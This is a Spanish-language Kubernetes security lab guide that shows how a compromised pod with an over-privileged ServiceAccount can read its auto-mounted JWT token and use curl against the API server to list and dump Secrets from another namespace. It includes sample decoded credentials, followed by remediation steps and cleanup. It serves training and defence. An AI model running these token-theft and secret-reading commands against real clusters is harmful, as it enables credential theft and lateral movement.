# Lab 4: JWT Token Theft & Pivoting

## Objetivo

Demostrar como un Pod comprometido con un ServiceAccount sobre-privilegiado puede robar el token JWT montado automaticamente, y usarlo para acceder a Secrets de otros namespaces en el cluster.

## Caso Real: Tesla Kubernetes Breach (2018)

Atacantes accedieron a un dashboard de Kubernetes sin autenticacion de Tesla. Desde ahi, obtuvieron ServiceAccount tokens que les permitieron acceder a Secrets con credenciales de AWS S3. Usaron esas credenciales para minar criptomonedas en la infraestructura de Tesla.

---

## Archivos

| Archivo | Descripcion |
|---------|-------------|
| `vulnerable-jwt.yaml` | SA sobre-privilegiado + Secrets en namespace prod + Pod comprometido |

---

## Fase 1: Desplegar Escenario Vulnerable

```bash
kubectl apply -f vulnerable-jwt.yaml
kubectl get pods -n lab2-jwt -w
kubectl get pods -n lab2-prod -w
# Esperar a que ambos pods esten Running
```

## Fase 2: Explotacion — Robo de JWT Token

### Paso 1: Acceder al pod comprometido

```bash
kubectl exec -it -n lab2-jwt compromised-app -- bash
```

### Paso 2: Leer el token JWT montado automaticamente

```bash
# El token se monta automaticamente aqui:
cat /var/run/secrets/kubernetes.io/serviceaccount/token
# Guardar el token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
echo $TOKEN
```

### Paso 3: Verificar permisos del token

```bash
# Usar curl para consultar la API de Kubernetes
APISERVER="https://kubernetes.default.svc"
CACERT="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"

# Listar namespaces
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces | grep '"name"'

# Listar pods en todos los namespaces
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/pods | grep '"name"' | head -20
```

### Paso 4: Robar Secrets de otro namespace (lab2-prod)

```bash
# Listar secrets en el namespace prod
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/lab2-prod/secrets | grep '"name"'

# Obtener credenciales de base de datos
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/lab2-prod/secrets/database-credentials | python3 -m json.tool

# Obtener API keys
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/lab2-prod/secrets/api-keys | python3 -m json.tool
```

### Paso 5: Decodificar los secrets robados

```bash
# Decodificar password de la DB
echo "UFByMGQtUzNjcjN0LURCLVBAc3N3MHJkIQ==" | base64 -d
# → PProD-S3cr3t-DB-P@ssw0rd!

# Decodificar API key de Stripe
echo "c2stbGl2ZS01MUNoYXJnZUFQSUtleTEyMzQ1Njc4OTA=" | base64 -d
# → sk-live-51ChargeAPIKey1234567890

# Decodificar AWS keys
echo "QUtJQVhYWFhYWFhYWFhYWFhYWA==" | base64 -d
# → AKIAXXXXXXXXXXXXXXXXXXXX
```

## Fase 3: Verificar variables de entorno expuestas

```bash
# En el pod comprometido
env | grep -i secret
# → APP_SECRET=internal-app-secret-key-12345

# Desde el pod prod, secrets como env vars
kubectl exec -n lab2-prod prod-api -- env | grep -i -E "(db_|stripe|aws)"
```

---

## Remediacion

| Medida | Como implementar |
|--------|-----------------|
| **Deshabilitar automount** | `automountServiceAccountToken: false` |
| **Roles minimos** | Usar Role (namespaced) en vez de ClusterRole |
| **Secrets como volumeMounts** | Montar secrets en archivos, no env vars |
| **Rotacion de tokens** | Usar projected tokens con expiracion |
| **OPA/Kyverno** | Policies que impidan ClusterRoleBindings permisivos |

---

## Cleanup

```bash
kubectl delete namespace lab2-jwt
kubectl delete namespace lab2-prod
kubectl delete clusterrole secret-reader-all
kubectl delete clusterrolebinding sa-secret-reader-binding
```
